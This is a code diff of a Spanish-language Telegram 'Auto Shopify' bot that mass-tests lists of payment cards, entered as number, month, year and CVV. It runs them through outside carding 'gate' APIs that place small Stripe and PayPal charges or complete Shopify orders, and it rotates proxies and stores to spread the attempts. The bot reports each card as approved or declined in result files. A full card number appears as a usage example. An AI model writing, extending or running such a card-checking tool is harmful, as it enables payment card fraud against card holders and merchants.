@@ -31,7 +31,7 @@ def init_database():
     conn = get_db_connection()
     cursor = conn.cursor()
     
-    # Crear tablas
+    # Tabla de proxies
     cursor.execute('''CREATE TABLE IF NOT EXISTS proxies (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         proxy TEXT UNIQUE,
@@ -43,6 +43,7 @@ def init_database():
         status TEXT DEFAULT 'untested'
     )''')
     
+    # Tabla de historial
     cursor.execute('''CREATE TABLE IF NOT EXISTS historial (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         cc TEXT,
@@ -56,11 +57,22 @@ def init_database():
         fecha TEXT
     )''')
     
+    # Tabla de tarjetas
     cursor.execute('''CREATE TABLE IF NOT EXISTS tarjetas (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         cc TEXT UNIQUE,
         fecha TEXT,
         veces_verificada INTEGER DEFAULT 0
+    )''')
+    
+    # ========== NUEVA TABLA PARA SITIOS SHOPIFY ==========
+    cursor.execute('''CREATE TABLE IF NOT EXISTS sitios (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        url TEXT UNIQUE,
+        fecha TEXT,
+        successes INTEGER DEFAULT 0,
+        failures INTEGER DEFAULT 0,
+        last_used TEXT
     )''')
     
     # Agregar columnas si no existen
@@ -210,6 +222,106 @@ def actualizar_status_proxy(proxy, status, tiempo):
     conn.commit()
     conn.close()
 
+# ==================== NUEVAS FUNCIONES PARA SITIOS SHOPIFY ====================
+
+def guardar_sitio(url):
+    """Guarda un sitio Shopify en la base de datos"""
+    conn = None
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)", 
+                      (url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        conn.commit()
+        return True
+    except Exception as e:
+        print(f"Error guardando sitio: {e}")
+        return False
+    finally:
+        if conn:
+            conn.close()
+
+def guardar_sitios_desde_texto(texto):
+    """Guarda sitios desde un archivo de texto"""
+    lineas = texto.strip().split('\n')
+    guardados = 0
+    repetidos = 0
+    invalidos = 0
+    
+    # Patrón para identificar URLs de Shopify
+    patron_url = re.compile(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$')
+    
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    
+    for linea in lineas:
+        linea = linea.strip()
+        if not linea:
+            continue
+        
+        # Verificar si es una URL válida de Shopify
+        if patron_url.match(linea):
+            try:
+                cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)",
+                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+                conn.commit()
+                guardados += 1
+            except:
+                repetidos += 1
+        else:
+            invalidos += 1
+    
+    conn.close()
+    return guardados, repetidos, invalidos
+
+def obtener_sitios():
+    """Obtiene todos los sitios Shopify"""
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT url FROM sitios")
+    sitios = [row[0] for row in cursor.fetchall()]
+    conn.close()
+    return sitios
+
+def obtener_sitios_con_estadisticas():
+    """Obtiene sitios con sus estadísticas"""
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT url, successes, failures, last_used FROM sitios ORDER BY successes DESC, failures ASC")
+    resultados = cursor.fetchall()
+    conn.close()
+    return resultados
+
+def eliminar_sitio(url):
+    """Elimina un sitio específico"""
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
+    conn.commit()
+    filas = cursor.rowcount
+    conn.close()
+    return filas > 0
+
+def eliminar_todos_sitios():
+    """Elimina TODOS los sitios de la base de datos"""
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("DELETE FROM sitios")
+    conn.commit()
+    filas = cursor.rowcount
+    conn.close()
+    return filas
+
+def actualizar_estadisticas_sitio(url, success):
+    """Actualiza estadísticas de un sitio"""
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    campo = "successes" if success else "failures"
+    cursor.execute(f"UPDATE sitios SET {campo} = {campo} + 1, last_used = ? WHERE url = ?", 
+                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
+    conn.commit()
+    conn.close()
+
 # ==================== FUNCIONES DE TARJETAS ====================
 
 def guardar_tarjetas_desde_texto(texto):
@@ -307,6 +419,9 @@ def obtener_estadisticas():
     cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM proxies")
     stats_proxies = cursor.fetchone()
     
+    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM sitios")
+    stats_sitios = cursor.fetchone()
+    
     cursor.execute("SELECT COUNT(*) FROM tarjetas")
     total_tarjetas = cursor.fetchone()[0]
     
@@ -320,8 +435,11 @@ def obtener_estadisticas():
     
     return {
         'proxies': stats_proxies[0] or 0,
-        'exits': stats_proxies[1] or 0,
-        'fallos': stats_proxies[2] or 0,
+        'exits_proxy': stats_proxies[1] or 0,
+        'fallos_proxy': stats_proxies[2] or 0,
+        'sitios': stats_sitios[0] or 0,
+        'exits_sitio': stats_sitios[1] or 0,
+        'fallos_sitio': stats_sitios[2] or 0,
         'tarjetas': total_tarjetas or 0,
         'checks': total_checks or 0,
         'aprobadas': total_success or 0
@@ -356,14 +474,14 @@ def consultar_bin(bin_number):
     except Exception as e:
         return {"error": str(e), "bin": bin_number}
 
-# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE ====================
+# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE $1 ====================
 
 def verificar_api_stripe(cc, proxy=None):
     """
-    Verifica usando Stripe (endpoint original) - $5.00
+    Verifica usando Stripe (endpoint /api/check3) - $1.00
     """
     try:
-        api_url = f"https://samurai-api-hub.up.railway.app/api/check?c={cc}"
+        api_url = f"https://samurai-api-hub.up.railway.app/api/check3?c={cc}"
         if proxy:
             api_url += f"&p={proxy}"
         
@@ -375,15 +493,16 @@ def verificar_api_stripe(cc, proxy=None):
             data = response.json()
             status = data.get('status', 'unknown')
             message = data.get('message', 'Sin mensaje')
-            gates = data.get('gates', 'stripe 5.00$ charged')
+            gates = data.get('gates', 'stripe 1.00$ charged')
+            amount = data.get('amount', '1.00')
             
             return {
                 'success': status == 'success',
                 'status': status,
                 'message': message,
                 'gates': gates,
-                'gate_name': 'Stripe $5.00',
-                'amount': '5.00',
+                'gate_name': 'Stripe $1.00',
+                'amount': amount,
                 'proxy': proxy if proxy else 'gestionado',
                 'tiempo': elapsed
             }
@@ -394,8 +513,8 @@ def verificar_api_stripe(cc, proxy=None):
                 'status': 'error',
                 'message': f'HTTP {response.status_code}',
                 'gates': 'stripe error',
-                'gate_name': 'Stripe $5.00',
-                'amount': '5.00',
+                'gate_name': 'Stripe $1.00',
+                'amount': '1.00',
                 'proxy': proxy if proxy else 'gestionado',
                 'tiempo': elapsed
             }
@@ -406,8 +525,8 @@ def verificar_api_stripe(cc, proxy=None):
             'status': 'error',
             'message': str(e),
             'gates': 'stripe error',
-            'gate_name': 'Stripe $5.00',
-            'amount': '5.00',
+            'gate_name': 'Stripe $1.00',
+            'amount': '1.00',
             'proxy': proxy if proxy else 'gestionado',
             'tiempo': 30
         }
@@ -475,6 +594,68 @@ def verificar_api_paypal(cc, gate=1, proxy=None):
             'gates': 'paypal error',
             'gate_name': gate_info['name'],
             'amount': gate_info['amount'],
+            'proxy': proxy if proxy else 'gestionado',
+            'tiempo': 30
+        }
+
+# ==================== NUEVA FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================
+
+def verificar_api_autoshopify(cc, url, proxy=None):
+    """
+    Verifica usando AutoShopify (endpoint shopi.php)
+    """
+    try:
+        api_url = f"http://dev-kamal.pw/shopi.php?cc={cc}&url={url}"
+        if proxy:
+            api_url += f"&proxy={proxy}"
+        
+        start_time = time.time()
+        response = requests.get(api_url, timeout=30)
+        elapsed = time.time() - start_time
+        
+        try:
+            data = response.json()
+            response_text = data.get('Response', 'Unknown')
+            price = data.get('Price', '0.00')
+            gate = data.get('Gate', 'Shopify')
+            
+            # Determinar si es éxito
+            is_success = 'Order completed' in response_text
+            
+            return {
+                'success': is_success,
+                'status': 'success' if is_success else 'failed',
+                'message': response_text,
+                'gates': f"Shopify ${price}",
+                'gate_name': f"AutoShopify ${price}",
+                'amount': price,
+                'url': url,
+                'proxy': proxy if proxy else 'gestionado',
+                'tiempo': elapsed
+            }
+            
+        except json.JSONDecodeError:
+            return {
+                'success': False,
+                'status': 'error',
+                'message': f'HTTP {response.status_code} - {response.text[:100]}',
+                'gates': 'shopify error',
+                'gate_name': 'AutoShopify',
+                'amount': '0.00',
+                'url': url,
+                'proxy': proxy if proxy else 'gestionado',
+                'tiempo': elapsed
+            }
+            
+    except Exception as e:
+        return {
+            'success': False,
+            'status': 'error',
+            'message': str(e),
+            'gates': 'shopify error',
+            'gate_name': 'AutoShopify',
+            'amount': '0.00',
+            'url': url,
             'proxy': proxy if proxy else 'gestionado',
             'tiempo': 30
         }
@@ -718,11 +899,12 @@ def menu_principal():
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("💳 Tarjetas", callback_data='menu_tarjetas')
     btn2 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
-    btn3 = types.InlineKeyboardButton("💵 Stripe $5", callback_data='menu_stripe')
+    btn3 = types.InlineKeyboardButton("💵 Stripe $1", callback_data='menu_stripe')
     btn4 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
-    btn5 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
-    btn6 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
+    btn5 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
+    btn6 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
+    btn7 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
     return markup
 
 def menu_tarjetas():
@@ -755,6 +937,18 @@ def menu_paypal():
     markup.add(btn1, btn2, btn3, btn4)
     return markup
 
+def menu_shopify():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn1 = types.InlineKeyboardButton("➕ Añadir sitio", callback_data='add_sitio')
+    btn2 = types.InlineKeyboardButton("📋 Listar sitios", callback_data='listar_sitios')
+    btn3 = types.InlineKeyboardButton("🗑️ Eliminar sitio", callback_data='del_sitio')
+    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_sitios')
+    btn5 = types.InlineKeyboardButton("🔍 Verificar una", callback_data='shopify_individual')
+    btn6 = types.InlineKeyboardButton("📦 Verificar masivo", callback_data='shopify_masivo')
+    btn7 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
+    return markup
+
 # ==================== COMANDOS PRINCIPALES ====================
 
 @bot.message_handler(commands=['start', 'menu'])
@@ -764,23 +958,27 @@ def cmd_menu(message):
         "║    🚀  AUTO SHOPIFY BOT    ║\n"
         "╠════════════════════════════╣\n"
         "║  Gates disponibles:         ║\n"
-        "║  • Stripe: $5.00            ║\n"
-        "║  • PayPal: $10.00           ║\n"
-        "║  • PayPal: $0.10            ║\n"
-        "║  • PayPal: $1.00            ║\n"
+        "║  • Stripe: $1.00            ║\n"
+        "║  • PayPal: $10/$0.10/$1    ║\n"
+        "║  • AutoShopify: variable   ║\n"
         "║                            ║\n"
         "║  Proxies:                   ║\n"
         "║  • Envía archivo .txt       ║\n"
         "║  • /px - Testear proxies    ║\n"
-        "║  • /delallproxy - Eliminar todos║\n"
+        "║                            ║\n"
+        "║  Sitios Shopify:            ║\n"
+        "║  • /addsh URL - Agregar    ║\n"
+        "║  • /sitios - Listar        ║\n"
         "║                            ║\n"
         "║  Comandos rápidos:          ║\n"
-        "║  /check CC - Stripe        ║\n"
+        "║  /check CC - Stripe $1     ║\n"
         "║  /pp CC - PayPal $10       ║\n"
         "║  /pp2 CC - PayPal $0.10    ║\n"
         "║  /pp3 CC - PayPal $1       ║\n"
+        "║  /sh CC - AutoShopify      ║\n"
         "║  /mass - Stripe masivo     ║\n"
         "║  /mpp - PayPal masivo      ║\n"
+        "║  /msh - Shopify masivo     ║\n"
         "╚════════════════════════════╝\n\n"
         "Selecciona una opción:"
     )
@@ -796,20 +994,26 @@ def cmd_help(message):
         "║    navegar por el menú     ║\n"
         "║                            ║\n"
         "║  • Comandos individuales:  ║\n"
-        "║    /check CC - Stripe $5   ║\n"
+        "║    /check CC - Stripe $1   ║\n"
         "║    /pp CC - PayPal $10     ║\n"
         "║    /pp2 CC - PayPal $0.10  ║\n"
         "║    /pp3 CC - PayPal $1     ║\n"
+        "║    /sh CC - AutoShopify    ║\n"
         "║                            ║\n"
         "║  • Comandos masivos:       ║\n"
         "║    /mass - Stripe masivo   ║\n"
         "║    /mpp - PayPal masivo    ║\n"
+        "║    /msh - Shopify masivo   ║\n"
+        "║                            ║\n"
+        "║  • Sitios Shopify:          ║\n"
+        "║    /addsh URL - Agregar    ║\n"
+        "║    /sitios - Listar        ║\n"
+        "║    /delsh URL - Eliminar   ║\n"
         "║                            ║\n"
         "║  • Proxies:                 ║\n"
         "║    Envía archivo .txt       ║\n"
         "║    /px - Testear proxies    ║\n"
         "║    /proxies - Ver lista     ║\n"
-        "║    /delallproxy - Eliminar todos║\n"
         "║                            ║\n"
         "║  • Otros comandos:         ║\n"
         "║    /bin BIN - Consultar BIN║\n"
@@ -818,60 +1022,336 @@ def cmd_help(message):
     )
     bot.reply_to(message, texto)
 
-@bot.message_handler(commands=['delallproxy'])
-def cmd_del_all_proxies(message):
-    """Elimina TODOS los proxies"""
+@bot.message_handler(commands=['addsh'])
+def cmd_add_sitio(message):
+    """Agrega un sitio Shopify"""
+    try:
+        url = message.text.split()[1]
+        if guardar_sitio(url):
+            bot.reply_to(message, f"✅ Sitio guardado:\n{url}")
+        else:
+            bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida")
+    except IndexError:
+        bot.reply_to(message, "❌ Uso: /addsh https://tienda.myshopify.com")
+
+@bot.message_handler(commands=['sitios'])
+def cmd_listar_sitios(message):
+    """Lista todos los sitios Shopify"""
+    sitios = obtener_sitios_con_estadisticas()
+    
+    if not sitios:
+        bot.send_message(message.chat.id, "📭 No hay sitios guardados")
+        return
+    
+    texto = "╔════════════════════════════╗\n║     🛍️ MIS SITIOS        ║\n╠════════════════════════════╣\n"
+    
+    for url, succ, fail, last_used in sitios[:10]:
+        url_short = url[:25] + "..." if len(url) > 25 else url
+        total = succ + fail
+        tasa = (succ/total*100) if total > 0 else 0
+        
+        texto += f"║ {url_short:<28} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 {tasa:.1f}%            ║\n"
+    
+    texto += "╚════════════════════════════╝"
+    bot.send_message(message.chat.id, texto, reply_markup=menu_shopify())
+
+@bot.message_handler(commands=['delsh'])
+def cmd_del_sitio(message):
+    """Elimina un sitio Shopify"""
+    try:
+        url = message.text.split()[1]
+        if eliminar_sitio(url):
+            bot.reply_to(message, f"✅ Sitio eliminado: {url[:30]}...")
+        else:
+            bot.reply_to(message, "❌ Sitio no encontrado")
+    except IndexError:
+        bot.reply_to(message, "❌ Uso: /delsh https://tienda.myshopify.com")
+
+@bot.message_handler(commands=['delallsitios'])
+def cmd_del_all_sitios(message):
+    """Elimina TODOS los sitios"""
     confirmacion = types.InlineKeyboardMarkup()
-    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_proxies')
-    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_proxies')
+    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
+    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
     confirmacion.add(btn1, btn2)
     
     bot.reply_to(
         message, 
-        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los proxies guardados permanentemente.",
+        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
         parse_mode='Markdown',
         reply_markup=confirmacion
     )
 
-@bot.message_handler(commands=['bin'])
-def cmd_bin(message):
+# ==================== COMANDOS DE VERIFICACIÓN AUTOSHOPIFY ====================
+
+@bot.message_handler(commands=['sh'])
+def cmd_shopify(message):
+    """Verificar con AutoShopify"""
     try:
-        bin_num = message.text.split()[1][:6]
+        partes = message.text.split()
+        cc = partes[1]
         
-        msg = bot.reply_to(message, f"🔍 Consultando BIN {bin_num}...")
+        # Validar formato de tarjeta
+        if len(cc.split('|')) != 4:
+            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
+            return
+        
+        # Obtener sitios disponibles
+        sitios = obtener_sitios()
+        
+        if not sitios:
+            bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
+            return
+        
+        # Si se proporciona URL específica
+        if len(partes) == 3:
+            url = partes[2]
+            if url not in sitios:
+                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
+                return
+        else:
+            # Seleccionar sitio aleatorio
+            url = random.choice(sitios)
+        
+        numero = cc.split('|')[0]
+        bin_num = numero[:6]
+        
+        msg = bot.reply_to(message, f"🔍 Verificando con AutoShopify...\nSitio: {url[:30]}...")
         
         bin_info = consultar_bin(bin_num)
+        user_name = message.from_user.first_name if message.from_user else "User"
         
-        if 'error' in bin_info:
-            texto = f"❌ Error: {bin_info['error']}"
+        proxies = obtener_proxies()
+        mejor_resultado = None
+        
+        if proxies:
+            for proxy in proxies[:3]:
+                resultado = verificar_api_autoshopify(cc, url, proxy)
+                if not mejor_resultado or resultado['success']:
+                    mejor_resultado = resultado
+                time.sleep(1)
         else:
-            scheme = bin_info.get('scheme', 'UNKNOWN').upper()
-            card_type = bin_info.get('type', 'UNKNOWN').upper()
-            country = bin_info.get('country', {}).get('name', 'Unknown')
-            country_emoji = bin_info.get('country', {}).get('emoji', '🌍')
-            bank = bin_info.get('bank', {}).get('name', 'Unknown')
-            
-            texto = f"""
-📊 *INFORMACIÓN DEL BIN {bin_num}*
-
-🏦 *Esquema:* {scheme}
-💳 *Tipo:* {card_type}
-🌍 *País:* {country} {country_emoji}
-🏛️ *Banco:* {bank}
-
-🔍 *BIN válido*
-            """
+            mejor_resultado = verificar_api_autoshopify(cc, url)
         
-        bot.edit_message_text(texto, message.chat.id, msg.message_id, parse_mode='Markdown')
+        if mejor_resultado:
+            guardar_historial(cc, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
+                            mejor_resultado['amount'], mejor_resultado['status'], 
+                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
+            
+            # Actualizar estadísticas del sitio
+            actualizar_estadisticas_sitio(url, mejor_resultado['success'])
+            
+            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Shopify")
+            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
+        else:
+            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
         
     except IndexError:
-        bot.reply_to(message, "❌ Uso: /bin 559888")
+        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
 
-# ==================== COMANDOS INDIVIDUALES ====================
+# ==================== VERIFICACIÓN MASIVA AUTOSHOPIFY ====================
+
+@bot.message_handler(commands=['msh'])
+def cmd_mass_shopify(message):
+    """Verificación masiva con AutoShopify"""
+    
+    tarjetas = obtener_todas_tarjetas()
+    sitios = obtener_sitios()
+    
+    if not tarjetas:
+        bot.reply_to(message, "📭 No hay tarjetas guardadas")
+        return
+    
+    if not sitios:
+        bot.reply_to(message, "📭 No hay sitios guardados. Usa /addsh para agregar.")
+        return
+    
+    # Procesar opciones
+    texto = message.text.split()
+    delay = 3
+    notificar_cada = 10
+    
+    for i, arg in enumerate(texto):
+        if arg == '--delay' and i+1 < len(texto):
+            try:
+                delay = int(texto[i+1])
+            except:
+                pass
+        elif arg == '--notificar' and i+1 < len(texto):
+            try:
+                notificar_cada = int(texto[i+1])
+            except:
+                pass
+    
+    proxies = obtener_proxies()
+    if not proxies:
+        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
+    
+    task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
+    
+    active_tasks[task_id] = {
+        'chat_id': message.chat.id,
+        'cancel': False
+    }
+    
+    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY
+━━━━━━━━━━━━━━━━━━━━━━
+📌 Tarjetas: {len(tarjetas)}
+🌐 Sitios: {len(sitios)}
+⏱️ Delay: {delay}s
+🔔 Notificar: cada {notificar_cada}
+🆔 ID: {task_id}
+
+/cancelar_{task_id} - Cancelar"""
+    
+    bot.reply_to(message, config)
+    
+    thread = Thread(target=procesar_verificacion_masiva_shopify, 
+                   args=(task_id, message.chat.id, delay, notificar_cada))
+    thread.daemon = True
+    thread.start()
+
+def procesar_verificacion_masiva_shopify(task_id, chat_id, delay, notificar_cada):
+    """Procesa verificación masiva con AutoShopify"""
+    
+    cards = [c[0] for c in obtener_todas_tarjetas()]
+    sitios = obtener_sitios()
+    total_tarjetas = len(cards)
+    total_sitios = len(sitios)
+    
+    if total_tarjetas == 0 or total_sitios == 0:
+        bot.send_message(chat_id, "📭 No hay tarjetas o sitios suficientes")
+        return
+    
+    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Shopify...")
+    
+    procesadas = 0
+    resultados = {'success': 0, 'failed': 0, 'error': 0}
+    detalles = []
+    start_time = time.time()
+    sitio_index = 0
+    proxy_index = 0
+    
+    proxies = obtener_proxies()
+    
+    for i, card in enumerate(cards, 1):
+        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
+            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
+            break
+        
+        # Rotación de sitios (round robin)
+        sitio = sitios[sitio_index % total_sitios]
+        sitio_index += 1
+        
+        bin_info = consultar_bin(card[:6])
+        
+        mejor_resultado = None
+        if proxies:
+            # Rotación de proxies
+            proxy = proxies[proxy_index % len(proxies)]
+            proxy_index += 1
+            resultado = verificar_api_autoshopify(card, sitio, proxy)
+            mejor_resultado = resultado
+        else:
+            resultado = verificar_api_autoshopify(card, sitio)
+            mejor_resultado = resultado
+        
+        if mejor_resultado:
+            guardar_historial(card, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
+                            mejor_resultado['amount'], mejor_resultado['status'], 
+                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
+            
+            # Actualizar estadísticas del sitio
+            actualizar_estadisticas_sitio(sitio, mejor_resultado['success'])
+            
+            if mejor_resultado['status'] == 'success':
+                resultados['success'] += 1
+                estado_emoji = "✅"
+            elif mejor_resultado['status'] == 'failed':
+                resultados['failed'] += 1
+                estado_emoji = "❌"
+            else:
+                resultados['error'] += 1
+                estado_emoji = "⚠️"
+            
+            detalles.append(f"{estado_emoji} {card} | Sitio: {sitio[:30]}... | {mejor_resultado['status']} | {mejor_resultado['message'][:30]}")
+        
+        procesadas = i
+        
+        # Actualizar cada N tarjetas
+        if i % notificar_cada == 0 or i == total_tarjetas:
+            porcentaje = (i / total_tarjetas) * 100
+            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
+            
+            texto = f"""📊 PROGRESO: {i}/{total_tarjetas}
+{barra} {porcentaje:.0f}%
+
+✅ Aprobadas: {resultados['success']}
+❌ Declinadas: {resultados['failed']}
+⚠️ Errores: {resultados['error']}"""
+            
+            try:
+                bot.edit_message_text(texto, chat_id, msg.message_id)
+            except:
+                pass
+        
+        if delay > 0 and i < total_tarjetas:
+            time.sleep(delay)
+    
+    # Generar archivo de resultados
+    tiempo_total = time.time() - start_time
+    minutos = int(tiempo_total // 60)
+    segundos = int(tiempo_total % 60)
+    
+    filename = f"resultados_shopify_{task_id}.txt"
+    with open(filename, 'w', encoding='utf-8') as f:
+        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"Total tarjetas: {total_tarjetas}\n")
+        f.write(f"Sitios usados: {total_sitios}\n")
+        f.write(f"Tiempo: {minutos}m {segundos}s\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+        f.write(f"✅ Aprobadas: {resultados['success']}\n")
+        f.write(f"❌ Declinadas: {resultados['failed']}\n")
+        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
+        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
+        for d in detalles:
+            f.write(f"{d}\n")
+    
+    # Mensaje final
+    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA
+━━━━━━━━━━━━━━━━━━━━━━
+📊 RESULTADOS:
+✅ Aprobadas: {resultados['success']}
+❌ Declinadas: {resultados['failed']}
+⚠️ Errores: {resultados['error']}
+⏱️ Tiempo: {minutos}m {segundos}s
+
+📁 Se generó archivo con detalles"""
+    
+    try:
+        bot.edit_message_text(texto_final, chat_id, msg.message_id)
+    except:
+        bot.send_message(chat_id, texto_final)
+    
+    # Enviar archivo
+    with open(filename, 'rb') as f:
+        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify - {total_tarjetas} tarjetas")
+    
+    os.remove(filename)
+    
+    time.sleep(300)
+    if task_id in active_tasks:
+        del active_tasks[task_id]
+
+# ==================== COMANDOS DE VERIFICACIÓN STRIPE ====================
 
 @bot.message_handler(commands=['check'])
 def cmd_check(message):
-    """Verificar con Stripe $5.00"""
+    """Verificar con Stripe $1.00"""
     try:
         cc = message.text.split()[1]
         
@@ -883,7 +1363,7 @@ def cmd_check(message):
         numero = partes[0]
         bin_num = numero[:6]
         
-        msg = bot.reply_to(message, "🔍 Verificando con Stripe $5.00...")
+        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.00...")
         
         bin_info = consultar_bin(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
@@ -913,6 +1393,8 @@ def cmd_check(message):
         bot.reply_to(message, "❌ Uso: /check NUMERO|MES|AÑO|CVV")
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
+
+# ==================== COMANDOS DE VERIFICACIÓN PAYPAL ====================
 
 @bot.message_handler(commands=['pp'])
 def cmd_pp(message):
@@ -1053,7 +1535,7 @@ def cmd_pp3(message):
 
 @bot.message_handler(commands=['mass'])
 def cmd_mass_stripe(message):
-    """Verificación masiva con Stripe $5.00"""
+    """Verificación masiva con Stripe $1.00"""
     
     tarjetas = obtener_todas_tarjetas()
     
@@ -1089,7 +1571,7 @@ def cmd_mass_stripe(message):
         'cancel': False
     }
     
-    config = f"""📋 VERIFICACIÓN MASIVA STRIPE
+    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1
 ━━━━━━━━━━━━━━━━━━━━━━
 📌 Tarjetas: {len(tarjetas)}
 ⏱️ Delay: {delay}s
@@ -1188,7 +1670,7 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
     
     filename = f"resultados_stripe_{task_id}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
-        f.write(f"RESULTADOS VERIFICACIÓN STRIPE\n")
+        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1\n")
         f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
         f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write(f"Total tarjetas: {total}\n")
@@ -1202,7 +1684,7 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
             f.write(f"{d}\n")
     
     # Mensaje final
-    texto_final = f"""✅ VERIFICACIÓN COMPLETADA
+    texto_final = f"""✅ VERIFICACIÓN STRIPE $1 COMPLETADA
 ━━━━━━━━━━━━━━━━━━━━━━
 📊 RESULTADOS:
 ✅ Aprobadas: {resultados['success']}
@@ -1219,7 +1701,7 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
     
     # Enviar archivo
     with open(filename, 'rb') as f:
-        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe - {total} tarjetas")
+        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1 - {total} tarjetas")
     
     os.remove(filename)
     
@@ -1285,7 +1767,7 @@ def cmd_mass_paypal(message):
     thread.start()
 
 def procesar_verificacion_masiva_paypal(task_id, chat_id, delay, notificar_cada):
-    """Procesa verificación masiva con PayPal - VERSIÓN CON RESPUESTAS REALES"""
+    """Procesa verificación masiva con PayPal"""
     
     cards = [c[0] for c in obtener_todas_tarjetas()]
     total = len(cards)
@@ -1479,6 +1961,15 @@ def callback_handler(call):
             reply_markup=menu_paypal()
         )
     
+    elif call.data == 'menu_shopify':
+        bot.edit_message_text(
+            "🛍️ *GESTIÓN DE SITIOS SHOPIFY*\n\nSelecciona una opción:",
+            call.message.chat.id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=menu_shopify()
+        )
+    
     elif call.data == 'paypal_10':
         bot.send_message(
             call.message.chat.id,
@@ -1503,8 +1994,54 @@ def callback_handler(call):
     elif call.data == 'menu_stripe':
         bot.send_message(
             call.message.chat.id,
-            "💳 *STRIPE $5.00*\n\nUsa: `/check NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check 4169161481963022|09|2029|859`",
